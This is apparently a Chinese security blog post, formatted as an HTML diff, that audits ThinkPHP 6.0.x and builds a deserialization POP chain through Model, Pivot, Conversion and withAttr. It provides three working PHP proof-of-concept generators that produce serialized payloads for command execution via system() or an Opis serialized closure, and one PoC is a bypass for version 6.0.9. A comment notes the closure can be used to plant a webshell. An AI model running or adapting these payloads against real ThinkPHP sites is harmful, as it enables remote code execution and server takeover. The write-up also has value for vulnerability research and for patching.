@@ -1,0 +1,291 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="6f203f864072b015f96d6224ef50875e">ThinkPHP6 反序列化漏洞</h1>
+<h3 data-content="1" id="773c2c685053241a43148a6c3177658b">环境W</h3>
+<p><code>tp6.0 apache php7.3</code></p>
+<h2 data-content="1" id="940b977ac524c745324ad4aaaec245d3">漏洞分析</h2>
+<p>反序列化漏洞需要存在 <code>unserialize()</code> 作为触发条件，修改入口文件</p>
+<pre><code>app/controller/Index.php</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122559-cef4a2ae-491c-1.png"/></p>
+<p>注意<code>tp6</code>的<code>url</code>访问直接是 /控制器/操作/参数…………，相比<code>tp5</code>少了模块这个地方，本地测试的需要注意。</p>
+<p>全局搜索 <code>__destruct</code></p>
+<p>可利用的在<code>/vendor/topthink/think-orm/src/Model.php</code> 里</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122559-cf013226-491c-1.png"/></p>
+<p>跟进<code>$this-&gt;save()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf13672a-491c-1.png"/></p>
+<p>去看一下 setAttrs 方法</p>
+<pre><code>public function setAttrs(array $data): void
+    {
+        // 进行数据处理
+        foreach ($data as $key =&gt; $value) {
+            $this-&gt;setAttr($key, $value, $data);
+        }
+    }
+public function setAttr(string $name, $value, array $data = []): void
+    {
+        if (……) {
+                    ……
+        } else {
+            // 检测修改器
+            $method = 'set' . Str::studly($name) . 'Attr';
+            if (method_exists($this, $method)) {
+                $array = $this-&gt;data;
+//注意这里可以调用动态函数，执行命令，但是上面对 method 进行字符串拼接
+                $value = $this-&gt;$method($value, array_merge($this-&gt;data, $data));        
+    }</code></pre>
+<p>这里是不通的，继续往下审计，</p>
+<p>跟进 <code>$this-&gt;updateDate()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf267dce-491c-1.png"/></p>
+<p>检查数据之后获取有更新的数据，这两个函数可以用来绕过下面的的 <code>if 语句</code></p>
+<p>后面构造<code>pop</code>的时候再细说。</p>
+<p>跟进检查允许字段<code>$this-&gt;checkAllowFields()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf3439e6-491c-1.png"/></p>
+<p>跟进 <code>$this-&gt;db</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf487c30-491c-1.png"/></p>
+<p>注意这个字符串拼接符号<code>$this-&gt;name . $this-&gt;suffix</code> ，可以利用其触发<code>__toString</code></p>
+<p>全局搜索 <code>__toString</code>,芜湖，来到了熟悉的<code>conversion</code>类里</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf56c042-491c-1.png"/></p>
+<p>继续跟进<code>__toArray</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf6c48e0-491c-1.png"/></p>
+<p>前面的遍历先不看，跟进 <code>getAttr()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf787f02-491c-1.png"/></p>
+<p>先看返回值 的 <code>$this-&gt;getValue</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf8d93e2-491c-1.png"/></p>
+<p>这里的</p>
+<pre><code>$closure = $this-&gt;withAttr[$fieldName];
+ $value   = $closure($value, $this-&gt;data);</code></pre>
+<p>注意看这里，我们是可以控制<code>$this-&gt;withAttr</code>的，那么就等同于控制了<code>$closure</code></p>
+<p>可以作为动态函数，执行命令。根据这个点，我们来构造pop。</p>
+<h2 data-content="1" id="92977d3ed282f6411863fc6146462b95">pop链构造</h2>
+<p>一开始 我们需要 控制 <code>$this-&gt;lazySave</code>变量为真，然后进入<code>save()</code>方法，需要执行<code>$this-&gt;updateDate</code>不能被 提前<code>return</code>，去看 <code>is_Empty() , trigger()</code>方法，</p>
+<pre><code>public function isEmpty(): bool
+    {
+        return empty($this-&gt;data);
+//FALSE if var exists and has a non-empty, non-zero value. Otherwise returns TRUE.
+//$this-&gt;data 可控，设置非空的数组就好。
+    }
+    protected function trigger(string $event): bool
+    {
+        if (!$this-&gt;withEvent) {
+//!$this-&gt;withEvent 可控
+            return true;
+        }</code></pre>
+<p>且还需要 <code>$this-&gt;exists</code> 为真 ，这个参数也是可控的。</p>
+<p>进入 <code>$this-&gt;updateData</code> 方法后，我们需要程序执行到 <code>$this-&gt;checkAllowFields()</code> 在此之前同样不能被<code>return</code></p>
+<p>跟进 <code>getChangedData()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cfa1c0ba-491c-1.png"/></p>
+<p>我们希望 <code>$data</code> 不改变，所以就令<code>$this-&gt;force</code> 为真。</p>
+<pre><code>$this-&gt;lazySave == true
+$this-&gt;data不为空
+$this-&gt;withEvent == false
+$this-&gt;exists == true
+$this-&gt;force == true</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-cfb48952-491c-1.png"/><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-cfc1dc10-491c-1.png"/></p>
+<p><code>model</code> 类是复用了<code>trait</code> 类 的，可以访问其属性，和方法。<code>Model</code> 类 是抽象类，不能被实例化，所以我们还需要找到其子类。</p>
+<p><code>Pivot</code>类就是我们需要找的类。</p>
+<p>到这里我们成功执行到了 <code>$this-&gt;checkAllowFields()</code>，还得进入 <code>$this-&gt;db()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-cfd38e10-491c-1.png"/></p>
+<p><code>$this-&gt;field</code>为空，<code>$this-&gt;schema</code>也为空。初始就是空数组，不做处理。</p>
+<p>现在进入到 <code>$this-&gt;db()</code> 里。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-cfe05852-491c-1.png"/></p>
+<p>将<code>$this-&gt;name</code> 或 <code>$this-&gt;suffix</code>设置为含有<code>__toString</code>的类对象就可以触发此魔术方法。</p>
+<p>但是这里有意思的是，我们需要触发<code>__toString</code> 的类 是<code>conversion</code> 类 而这个类是<code>trait</code>类，</p>
+<p>而当前的<code>model</code>类是 复用了 <code>conversion</code>类的，所以我们相当于重新调用一遍 <code>Pivot</code> 类。也就是重新调用一下自己，触发自己的的<code>__toString</code>方法。这个操作在<code>buuoj</code>上的一道题目中遇到过。</p>
+<p>再接着就是 <code>toJson() toArray()</code> ，前面两个<code>foreach</code> 不做处理，再下来这个<code>foreach</code>会进入最后一个<code>if分支</code>，调用<code>getAttr</code>方法。这个<code>foreach</code> 是遍历 <code>$this-&gt;data</code>，然后将<code>$data</code> 的<code>$key</code>传入<code>getAttr</code></p>
+<pre><code>$data = array_merge($this-&gt;data, $this-&gt;relation);
+
+        foreach ($data as $key =&gt; $val) {
+            if ($val instanceof Model || $val instanceof ModelCollection) {
+                // 关联模型对象
+                if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) {
+                    $val-&gt;visible($this-&gt;visible[$key]);
+                } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) {
+                    $val-&gt;hidden($this-&gt;hidden[$key]);
+                }
+                // 关联模型对象
+                if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) {
+                    $item[$key] = $val-&gt;toArray();
+                }
+            } elseif (isset($this-&gt;visible[$key])) {
+                $item[$key] = $this-&gt;getAttr($key);
+            } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) {
+                $item[$key] = $this-&gt;getAttr($key);
+            }
+        }</code></pre>
+<p>进入<code>getAttr</code> 方法，这里的<code>$name 是 $key</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-cff50680-491c-1.png"/></p>
+<p>跟进<code>getData</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-d00a5b66-491c-1.png"/></p>
+<p>跟进<code>getRealFieldName()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-d01b2522-491c-1.png"/></p>
+<pre><code>$this-&gt;strict `默认值为True 所以 `$fieldName = $key</code></pre>
+<p>，$key是一定存在与$this-&gt;data 里的，然后<code>$this-&gt;getdata()</code>返回的<code>$value</code>值就是 <code>$this-&gt;data[$key]</code>。</p>
+<p>最后return <code>$this-&gt;getValue($key, $this-&gt;data[$key], $relation)</code></p>
+<p>进入 <code>getValue()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-d0306bf8-491c-1.png"/></p>
+<p>同理，这里的<code>$fieldName</code>就是 <code>$key</code>，<code>$relation</code>在传入时设置值就是<code>false</code>，然后 我们设置一下<code>$this-&gt;withAttr[$fieldName]</code>的值，进入<code>if(``isset($this-&gt;withAttr[$fieldName]))</code>分支。进行命令执行。</p>
+<h3 data-content="1" id="0acf88630ac77a90fda081506a11a84d">poc</h3>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">think\model\concern</span><span class="p">;</span>
+
+<span class="k">trait</span> <span class="nx">Attribute</span><span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="o">=</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="s1">'whoami'</span><span class="p">];</span>
+    <span class="k">private</span> <span class="nv">$withAttr</span><span class="o">=</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="s1">'system'</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="k">trait</span> <span class="nx">ModelEvent</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$withEvent</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
+
+<span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
+    <span class="k">use</span> <span class="nx">model\concern\Attribute</span><span class="p">;</span>
+    <span class="k">use</span> <span class="nx">model\concern\ModelEvent</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$exists</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$force</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$lazySave</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$suffix</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exists</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">force</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazySave</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">withEvent</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span><span class="p">{}</span>
+
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Pivot</span><span class="p">(</span><span class="k">new</span> <span class="nx">Pivot</span><span class="p">())));</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>成功执行</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d040ebe0-491c-1.png"/></p>
+<pre><code>$value  = $closure($value, $this-&gt;data);</code></pre>
+<p>这个动态函数的参数有两个  第一个是 <code>$data</code> 的 <code>$value</code>  第二个就是 <code>$data</code> 数组。这里我们可以执行<code>system('whoami')</code>是因为<code>system</code>支持两个参数的，但是这里的参数问题导致我们的利用条件很局限。</p>
+<p>tp6自带一种<code>SerializableClosure</code>调用，也就是</p>
+<pre><code>\Opis\Closure\SerializableClosure</code></pre>
+<p>这个包呢，和<code>php</code>自带的反序列化函数不同的地方，就是可以反序列化函数，就是可以把函数反序列化。<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d04e41fa-491c-1.png"/></p>
+<p><code>php</code>对用户自定义函数的参数要求并不是很严格，可以看下面这个。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d05b537c-491c-1.png"/></p>
+<p>所以我们可以通过但反序列化函数绕过这里参数的限制。</p>
+<div class="highlight"><pre><span></span><span class="x">$func = function(){phpinfo();};</span>
+<span class="x">$closure = new \Opis\Closure\SerializableClosure($func);</span>
+<span class="x">$closure($value, $this-&gt;data);// 参数不用管。</span>
+</pre></div>
+<p>修改上面的pop</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">think\model\concern</span><span class="p">;</span>
+
+<span class="k">trait</span> <span class="nx">Attribute</span><span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$withAttr</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">trait</span> <span class="nx">ModelEvent</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$withEvent</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
+
+<span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
+    <span class="k">use</span> <span class="nx">model\concern\Attribute</span><span class="p">;</span>
+    <span class="k">use</span> <span class="nx">model\concern\ModelEvent</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$exists</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$force</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$lazySave</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$suffix</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span>
+    <span class="p">{</span>   
+    <span class="nv">$func</span> <span class="o">=</span> <span class="k">function</span><span class="p">(){</span><span class="nb">phpinfo</span><span class="p">();};</span><span class="c1">//可写马，测试用的phpinfo;</span>
+    <span class="nv">$b</span><span class="o">=</span><span class="nx">\Opis\Closure\serialize</span><span class="p">(</span><span class="nv">$func</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exists</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">force</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazySave</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">withEvent</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="o">=</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="s1">''</span><span class="p">];</span>
+
+        <span class="nv">$c</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> 
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">withAttr</span><span class="o">=</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="nv">$c</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span><span class="p">{}</span>
+<span class="k">require</span> <span class="s1">'closure/autoload.php'</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Pivot</span><span class="p">(</span><span class="k">new</span> <span class="nx">Pivot</span><span class="p">())));</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d06faafc-491c-1.png"/></p>
+<p>自行下载 <code>\Opis\Closure\</code>这个包，<a href="https://github.com/opis/closure" target="_blank">链接</a></p>
+<p><strong><code>poc</code>放在<code>closure</code> 文件夹同级。</strong></p>
+<h2 data-content="1" id="8467c95c7855e768e41412f4a51f7562">补充</h2>
+<h3 data-content="1" id="36f71e83cfa3ec01de23570f4ce2a614">6.0.9 bypass</h3>
+<p>在tp的依赖里有think-orm 这个拓展，<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d082df8c-491c-1.png"/></p>
+<p>这个拓展在2.0.41的版本里做出了一个更新，</p>
+<p><a href="https://github.com/top-think/think-orm/commit/375a3b11578a1740db60c4db05b8244c1de701cf" target="_blank">https://github.com/top-think/think-orm/commit/375a3b11578a1740db60c4db05b8244c1de701cf</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d093c946-491c-1.png"/></p>
+<p>这里不再直接使用$closure来处理，而是先判断是否继承闭包，因为反序列化闭包的存在，我认为还是可以上面的链子的，但是<code>topthink/framework</code> 在v6.0.3 版本后不再使用<code>opis/closure</code>  依赖，导致没办法利用。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d0a40ebe-491c-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d0b64f66-491c-1.png"/></p>
+<p>所以上面的利用链只能在 tp6.0.3及以前的版本使用。</p>
+<p>不过在利用点上面的if语句里有<code>getJsonValue</code> 方法，</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d0c3c524-491c-1.png"/></p>
+<p>依然可以触发漏洞，只不过没有闭包那么好用了。</p>
+<h3 data-content="1" id="e287766f26054a555bb0ad580193b5ea">poc</h3>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">namespace</span> <span class="nx">think\model\concern</span><span class="p">;</span>
+
+<span class="k">trait</span> <span class="nx">Attribute</span><span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="o">=</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="s1">'calc'</span><span class="p">]];</span>
+    <span class="k">private</span> <span class="nv">$withAttr</span><span class="o">=</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="p">[</span><span class="s1">'jiang'</span><span class="o">=&gt;</span><span class="s1">'system'</span><span class="p">]];</span>
+    <span class="k">protected</span> <span class="nv">$json</span><span class="o">=</span><span class="p">[</span><span class="s2">"jiang"</span><span class="p">];</span>
+    <span class="k">protected</span> <span class="nv">$jsonAssoc</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">trait</span> <span class="nx">ModelEvent</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$withEvent</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
+
+<span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
+    <span class="k">use</span> <span class="nx">model\concern\Attribute</span><span class="p">;</span>
+    <span class="k">use</span> <span class="nx">model\concern\ModelEvent</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$exists</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$force</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$lazySave</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$suffix</span><span class="p">;</span>
+
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exists</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">force</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazySave</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">withEvent</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">suffix</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span><span class="p">{}</span>
+
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Pivot</span><span class="p">(</span><span class="k">new</span> <span class="nx">Pivot</span><span class="p">())));</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<h2 data-content="1" id="353367b6a542cadde0148272ebd1aee9">写在后面</h2>
+<p>这个反序列化漏洞最终是利用了可变函数，以及函数的反序列化绕过参数的限制。所以当可以使用自定义函数的时候，参数就变得不是那么重要，再加上可以反序列化函数的这个包，可以利用的地方就更多了。如果有问题，还请师傅们指出。</p>
+</div>
+</div>
